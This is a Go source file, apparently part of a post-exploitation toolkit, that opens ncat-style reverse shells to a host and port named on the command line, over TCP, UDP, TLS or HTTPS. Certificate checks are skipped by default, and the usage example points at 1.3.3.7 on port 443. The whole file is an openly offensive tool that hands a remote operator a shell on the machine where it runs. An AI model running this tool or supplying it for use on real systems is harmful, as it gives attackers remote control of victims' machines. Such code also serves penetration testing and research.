package main
//Open ncat-style reverse shells.
//Options exist for TCP, TCP with TLS, and UDP.

import "fmt"
import "flag"
import "os"
import "strconv"
import "github.com/ofasgard/postex-tools/postex"

func main() {
	//perform OS detection and check for a valid shell
	filepath := postex.CheckShell()
	//parse flags
	flag.Usage = usage
	target := flag.String("t", "", "The target to connect to.")
	port := flag.Int("p", 8080, "The port to connect to.")
	protocol := flag.String("x", "tcp", "The protocol to connect with. Should be one of: 'tcp', 'udp', 'tls' or 'https'.")
	verify := flag.Bool("v", false, "Specify this flag to enable certificate verification on TLS connections.")
	flag.Parse()
	//validate flags that require a value
	if *target == "" {
		usage()
		return
	}
	//let's do it!
	switch *protocol {
		case "tcp":
			fmt.Println("Sending a present to", *target + ":" + strconv.Itoa(*port) + " using protocol 'tcp'.")
			postex.ReverseTCPShell(filepath, *target, *port)
		case "udp":
			fmt.Println("Sending a present to", *target + ":" + strconv.Itoa(*port) + " using protocol 'udp'.")
			postex.ReverseUDPShell(filepath, *target, *port)
		case "tls":
			fmt.Println("Sending a present to", *target + ":" + strconv.Itoa(*port) + " using protocol 'tls'.")
			postex.ReverseTCPShellTLS(filepath, *target, *port, !*verify)
		case "https":
			fmt.Println("Sending a present to", *target + ":" + strconv.Itoa(*port) + " using protocol 'tls'.")
			postex.ReverseShellHTTPS(filepath, *target, *port, "/input", "/output", !*verify)
		default:
			usage()
			return
	}	
}

func usage() {
	fmt.Fprintf(os.Stderr, "Usage of %s:\n\n", os.Args[0])
	flag.PrintDefaults()
	fmt.Fprintf(os.Stderr, "\n\nExample: %s -t 1.3.3.7 -p 443 -x tls\n", os.Args[0])
}
